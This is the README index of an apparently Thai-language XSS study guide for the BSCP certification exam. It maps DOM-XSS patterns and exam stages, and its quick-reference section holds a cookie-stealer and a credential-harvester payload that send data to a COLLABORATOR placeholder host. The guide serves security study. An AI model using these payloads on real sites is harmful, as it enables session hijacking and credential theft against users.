# XSS & DOM-Based XSS Complete Guide
> สำหรับเตรียมสอบ BSCP - รวมจาก botesjuan README + คำอธิบายเพิ่มเติม

---

## File Structure

```
📁 XSS-Guide/
│
├── 📄 README.md                         ← คุณอยู่ที่นี่ (Index)
│
├── 📄 01-XSS-Fundamentals.md            XSS พื้นฐาน, 3 ประเภท, SOP
├── 📄 02-DOM-XSS-Overview.md            DOM XSS, Source/Sink, DOM Invader
│
├── 📁 patterns/                         DOM XSS Patterns (8 patterns)
│   ├── 📄 pattern-1-angularjs.md
│   ├── 📄 pattern-2-document-write.md
│   ├── 📄 pattern-3-postmessage-json.md
│   ├── 📄 pattern-4-javascript-url.md
│   ├── 📄 pattern-5-innerhtml-ads.md
│   ├── 📄 pattern-6-reflected-eval.md
│   ├── 📄 pattern-7-cookie-manipulation.md
│   └── 📄 pattern-8-jquery-hashchange.md
│
├── 📄 03-Cookie-Stealer-Payloads.md     Payload collection
├── 📄 04-Bypass-Techniques.md           WAF bypass, encoding
└── 📄 05-Exam-Workflow.md               Exam workflow + Quick Reference
```

---

## Quick Navigation

### Part 1: XSS Fundamentals
| Topic | File | Description |
|-------|------|-------------|
| XSS Basics | [01-XSS-Fundamentals.md](01-XSS-Fundamentals.md) | XSS คืออะไร, 3 ประเภท |
| SOP & Bypass | [01-XSS-Fundamentals.md](01-XSS-Fundamentals.md) | ทำไม XSS bypass SOP |
| Cookie vs Credential | [01-XSS-Fundamentals.md](01-XSS-Fundamentals.md) | HttpOnly check |

### Part 2: DOM-Based XSS
| Topic | File | Description |
|-------|------|-------------|
| DOM XSS Overview | [02-DOM-XSS-Overview.md](02-DOM-XSS-Overview.md) | Source, Sink, Parse |
| DOM Invader | [02-DOM-XSS-Overview.md](02-DOM-XSS-Overview.md) | วิธีใช้ DOM Invader |

### DOM XSS Patterns
| Pattern | File | Source | Sink |
|---------|------|--------|------|
| 1. AngularJS | [pattern-1-angularjs.md](patterns/pattern-1-angularjs.md) | URL | ng-app template |
| 2. document.write | [pattern-2-document-write.md](patterns/pattern-2-document-write.md) | location.search | document.write |
| 3. postMessage + JSON | [pattern-3-postmessage-json.md](patterns/pattern-3-postmessage-json.md) | postMessage | element.src |
| 4. JavaScript URL | [pattern-4-javascript-url.md](patterns/pattern-4-javascript-url.md) | postMessage | location.href |
| 5. innerHTML Ads | [pattern-5-innerhtml-ads.md](patterns/pattern-5-innerhtml-ads.md) | postMessage | innerHTML |
| 6. Reflected eval | [pattern-6-reflected-eval.md](patterns/pattern-6-reflected-eval.md) | URL | eval() |
| 7. Cookie Manipulation | [pattern-7-cookie-manipulation.md](patterns/pattern-7-cookie-manipulation.md) | Cookie | document.write |
| 8. jQuery hashchange | [pattern-8-jquery-hashchange.md](patterns/pattern-8-jquery-hashchange.md) | location.hash | jQuery $() |

### Payloads & Techniques
| Topic | File | Description |
|-------|------|-------------|
| Cookie Stealers | [03-Cookie-Stealer-Payloads.md](03-Cookie-Stealer-Payloads.md) | Payload collection |
| Bypass Techniques | [04-Bypass-Techniques.md](04-Bypass-Techniques.md) | WAF bypass, encoding |
| Exam Workflow | [05-Exam-Workflow.md](05-Exam-Workflow.md) | Step-by-step workflow |

---

## BSCP Exam: XSS Stage Map

```
┌─────────────────────────────────────────────────────────────┐
│                    XSS in BSCP Exam                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Stage 1: Foothold                                          │
│  ─────────────────                                          │
│  • DOM-based XSS (Pattern 1-8)                             │
│  • Reflected XSS                                            │
│  • Goal: ขโมย cookie ของ user ธรรมดา                        │
│                                                             │
│  Stage 2: Privilege Escalation                              │
│  ────────────────────────────                               │
│  • Stored XSS (ถ้า admin เข้าดู)                            │
│  • Goal: ขโมย cookie ของ admin                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Quick Payload Reference

### Cookie Stealer (HttpOnly = false)
```javascript
fetch('https://COLLABORATOR/?c='+document.cookie)
```

### Credential Harvester (HttpOnly = true)
```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://COLLABORATOR',{method:'POST',body:username.value+':'+this.value})">
```

### DOM XSS Test String
```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

---

## Resources

- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PortSwigger DOM Invader Docs](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [botesjuan BSCP Study Guide](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)

---

> **Tip:** ความเร็วในการ **identify** DOM XSS สำคัญกว่าความเร็วในการ exploit!
